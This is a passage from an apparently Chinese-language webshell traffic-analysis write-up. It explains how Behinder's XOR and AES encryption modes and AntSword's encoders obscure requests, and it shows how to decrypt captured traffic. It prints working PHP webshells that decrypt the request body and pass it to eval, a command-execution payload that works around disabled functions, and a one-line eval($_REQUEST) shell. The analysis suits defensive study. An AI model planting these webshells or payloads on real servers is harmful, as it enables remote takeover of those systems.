<p>和哥斯拉不同的是每种加密函数都有对应的解密函数给出，默认密钥 <code>e45e329feb5d925b</code></p>
<p>通过生成服务端来获取webshell，还是以php代码为例</p>
<h4 id="default_xor_base64">default_xor_base64<a hidden class="anchor" aria-hidden="true" href="#default_xor_base64">#</a></h4>
<p>Encrypt：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Encrypt</span>($data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>; 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($data);$i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    	$data[$i] <span style="color:#f92672">=</span> $data[$i]<span style="color:#f92672">^</span>$key[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>]; 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $bs<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base64_&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;encode&#34;</span>;
</span></span><span style="display:flex;"><span>	$after<span style="color:#f92672">=</span>$bs($data<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $after;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Decrypt：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Decrypt</span>($data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>; 
</span></span><span style="display:flex;"><span>    $bs<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base64_&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;decode&#34;</span>;
</span></span><span style="display:flex;"><span>	$after<span style="color:#f92672">=</span>$bs($data<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($after);$i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    	$after[$i] <span style="color:#f92672">=</span> $after[$i]<span style="color:#f92672">^</span>$key[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>]; 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $after;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Decrypt</span>($data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>; 
</span></span><span style="display:flex;"><span>    $bs<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base64_&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;decode&#34;</span>;
</span></span><span style="display:flex;"><span>	$after<span style="color:#f92672">=</span>$bs($data<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($after);$i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    	$after[$i] <span style="color:#f92672">=</span> $after[$i]<span style="color:#f92672">^</span>$key[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>]; 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $after;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$post<span style="color:#f92672">=</span><span style="color:#a6e22e">Decrypt</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($post);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>流量包：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/19.png"></p>
<p>请求部分进行 <code>base64 + xor</code> 解密获取执行的命令：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/20.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getSafeStr</span>($str){
</span></span><span style="display:flex;"><span>    $s1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">iconv</span>(<span style="color:#e6db74">&#39;utf-8&#39;</span>,<span style="color:#e6db74">&#39;gbk//IGNORE&#39;</span>,$str);
</span></span><span style="display:flex;"><span>    $s0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">iconv</span>(<span style="color:#e6db74">&#39;gbk&#39;</span>,<span style="color:#e6db74">&#39;utf-8//IGNORE&#39;</span>,$s1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($s0 <span style="color:#f92672">==</span> $str){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $s0;
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">iconv</span>(<span style="color:#e6db74">&#39;gbk&#39;</span>,<span style="color:#e6db74">&#39;utf-8//IGNORE&#39;</span>,$str);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>($cmd,$path)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">ignore_user_abort</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;max_execution_time&#39;</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>    $PadtJn <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">ini_get</span>(<span style="color:#e6db74">&#39;disable_functions&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#66d9ef">empty</span>($PadtJn)) {
</span></span><span style="display:flex;"><span>        $PadtJn <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[, ]+/&#39;</span>, <span style="color:#e6db74">&#39;,&#39;</span>, $PadtJn);
</span></span><span style="display:flex;"><span>        $PadtJn <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $PadtJn);
</span></span><span style="display:flex;"><span>        $PadtJn <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_map</span>(<span style="color:#e6db74">&#39;trim&#39;</span>, $PadtJn);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $PadtJn <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $c <span style="color:#f92672">=</span> $cmd;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">FALSE</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">strtolower</span>(<span style="color:#66d9ef">PHP_OS</span>), <span style="color:#e6db74">&#39;win&#39;</span>)) {
</span></span><span style="display:flex;"><span>        $c <span style="color:#f92672">=</span> $c <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; 2&gt;&amp;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $JueQDBH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;is_callable&#39;</span>;
</span></span><span style="display:flex;"><span>    $Bvce <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;in_array&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($JueQDBH(<span style="color:#e6db74">&#39;system&#39;</span>) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span> $Bvce(<span style="color:#e6db74">&#39;system&#39;</span>, $PadtJn)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>($c);
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_contents</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_end_clean</span>();
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($JueQDBH(<span style="color:#e6db74">&#39;proc_open&#39;</span>) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span> $Bvce(<span style="color:#e6db74">&#39;proc_open&#39;</span>, $PadtJn)) {
</span></span><span style="display:flex;"><span>        $handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($c, <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pipe&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;r&#39;</span>
</span></span><span style="display:flex;"><span>            ),
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pipe&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;w&#39;</span>
</span></span><span style="display:flex;"><span>            ),
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pipe&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;w&#39;</span>
</span></span><span style="display:flex;"><span>            )
</span></span><span style="display:flex;"><span>        ), $pipes);
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">feof</span>($pipes[<span style="color:#ae81ff">1</span>])) {
</span></span><span style="display:flex;"><span>            $kWJW <span style="color:#f92672">.=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">proc_close</span>($handle);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($JueQDBH(<span style="color:#e6db74">&#39;passthru&#39;</span>) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span> $Bvce(<span style="color:#e6db74">&#39;passthru&#39;</span>, $PadtJn)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">passthru</span>($c);
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_contents</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_end_clean</span>();
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($JueQDBH(<span style="color:#e6db74">&#39;shell_exec&#39;</span>) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span> $Bvce(<span style="color:#e6db74">&#39;shell_exec&#39;</span>, $PadtJn)) {
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>($c);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($JueQDBH(<span style="color:#e6db74">&#39;exec&#39;</span>) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span> $Bvce(<span style="color:#e6db74">&#39;exec&#39;</span>, $PadtJn)) {
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exec</span>($c, $kWJW);
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">10</span>), $kWJW) <span style="color:#f92672">.</span> <span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($JueQDBH(<span style="color:#e6db74">&#39;exec&#39;</span>) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span> $Bvce(<span style="color:#e6db74">&#39;popen&#39;</span>, $PadtJn)) {
</span></span><span style="display:flex;"><span>        $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>($c, <span style="color:#e6db74">&#39;r&#39;</span>);
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_resource</span>($fp)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">feof</span>($fp)) {
</span></span><span style="display:flex;"><span>                $kWJW <span style="color:#f92672">.=</span> <span style="color:#a6e22e">fread</span>($fp, <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">pclose</span>($fp);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $kWJW <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        $result[<span style="color:#e6db74">&#34;status&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#e6db74">&#34;fail&#34;</span>);
</span></span><span style="display:flex;"><span>        $result[<span style="color:#e6db74">&#34;msg&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#e6db74">&#34;none of proc_open/passthru/shell_exec/exec/exec is available&#34;</span>);
</span></span><span style="display:flex;"><span>        $key <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;k&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">encrypt</span>(<span style="color:#a6e22e">json_encode</span>($result));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $result[<span style="color:#e6db74">&#34;status&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#e6db74">&#34;success&#34;</span>);
</span></span><span style="display:flex;"><span>    $result[<span style="color:#e6db74">&#34;msg&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">getSafeStr</span>($kWJW));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">encrypt</span>(<span style="color:#a6e22e">json_encode</span>($result));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Encrypt</span>($data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>; 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($data);$i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    	$data[$i] <span style="color:#f92672">=</span> $data[$i]<span style="color:#f92672">^</span>$key[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>]; 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $bs<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base64_&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;encode&#34;</span>;
</span></span><span style="display:flex;"><span>	$after<span style="color:#f92672">=</span>$bs($data<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $after;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Y2QgL2QgIkQ6XEFBQUNURlxXRUJccGhwU3R1ZHlfNjRccGhwc3R1ZHlfcHJvXFdXV1x0ZXN0XCImd2hvYW1p&#34;</span>;$cmd<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>($cmd);$path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RDovQUFBQ1RGL1dFQi9waHBTdHVkeV82NC9waHBzdHVkeV9wcm8vV1dXL3Rlc3Qv&#34;</span>;$path<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>($path);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>($cmd,$path);
</span></span></code></pre></div><p>可以看出执行的命令就是$cmd，命令执行目录为$path，返回的响应包中是一个encrypt过的json，里面有两条信息 $status 和 $msg，都是base64编码过的，其中$msg为执行结果：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/21.png"></p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/22.png"></p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/23.png"></p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/24.png"></p>
<h4 id="aes_with_magic">aes_with_magic<a hidden class="anchor" aria-hidden="true" href="#aes_with_magic">#</a></h4>
<p>Encrypt：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Encrypt</span>($data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>;
</span></span><span style="display:flex;"><span>    $encrypted<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">openssl_encrypt</span>($data, <span style="color:#e6db74">&#34;AES-128-ECB&#34;</span>, $key,<span style="color:#a6e22e">OPENSSL_PKCS1_PADDING</span>));
</span></span><span style="display:flex;"><span>    $magicNum<span style="color:#f92672">=</span><span style="color:#a6e22e">hexdec</span>(<span style="color:#a6e22e">substr</span>($key,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>))<span style="color:#f92672">%</span><span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span>$magicNum;$i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $encrypted<span style="color:#f92672">=</span>$encrypted<span style="color:#f92672">.</span><span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">mt_rand</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $encrypted;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Decrypt：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Decrypt</span>($data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>;
</span></span><span style="display:flex;"><span>    $magicNum<span style="color:#f92672">=</span><span style="color:#a6e22e">hexdec</span>(<span style="color:#a6e22e">substr</span>($key,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>))<span style="color:#f92672">%</span><span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    $data<span style="color:#f92672">=</span><span style="color:#a6e22e">substr</span>($data,<span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">strlen</span>($data)<span style="color:#f92672">-</span>$magicNum);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">openssl_decrypt</span>(<span style="color:#a6e22e">base64_decode</span>($data), <span style="color:#e6db74">&#34;AES-128-ECB&#34;</span>, $key,<span style="color:#a6e22e">OPENSSL_PKCS1_PADDING</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Decrypt</span>($data)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>;
</span></span><span style="display:flex;"><span>        $magicNum<span style="color:#f92672">=</span><span style="color:#a6e22e">hexdec</span>(<span style="color:#a6e22e">substr</span>($key,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>))<span style="color:#f92672">%</span><span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>        $data<span style="color:#f92672">=</span><span style="color:#a6e22e">substr</span>($data,<span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">strlen</span>($data)<span style="color:#f92672">-</span>$magicNum);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">openssl_decrypt</span>(<span style="color:#a6e22e">base64_decode</span>($data), <span style="color:#e6db74">&#34;AES-128-ECB&#34;</span>, $key,<span style="color:#a6e22e">OPENSSL_PKCS1_PADDING</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>$post<span style="color:#f92672">=</span><span style="color:#a6e22e">Decrypt</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($post);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>aes_with_magic 会在尾部添加几个随机字符用于干扰，长度根据 $magicNum 而定，比如本例中为4，又因为没有传入IV，所以解密时初始向量为 <code>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></p>
<p>流量包，请求包尾部有4个额外字符：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/25.png"></p>
<p>解密出执行内容以后，后续解密执行命令和执行结果都与之前没有区别：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/26.png"></p>
<h4 id="default_aes">default_aes<a hidden class="anchor" aria-hidden="true" href="#default_aes">#</a></h4>
<p>webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Decrypt</span>($data)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		$key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;e45e329feb5d925b&#34;</span>; <span style="color:#75715e">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">openssl_decrypt</span>(<span style="color:#a6e22e">base64_decode</span>($data), <span style="color:#e6db74">&#34;AES-128-ECB&#34;</span>, $key,<span style="color:#a6e22e">OPENSSL_PKCS1_PADDING</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>$post<span style="color:#f92672">=</span><span style="color:#a6e22e">Decrypt</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($post);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>和aes_with_magic的唯一区别是没有干扰字符，直接就可以拿请求包的数据进行解密</p>
<h3 id="中国蚁剑">中国蚁剑<a hidden class="anchor" aria-hidden="true" href="#中国蚁剑">#</a></h3>
<p><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
<p>蚁剑能配置自定义编码器：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/30.png"></p>
<p>这里用蚁剑自带的进行分析</p>
<p>webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_REQUEST[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>流量包：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/27.png"></p>
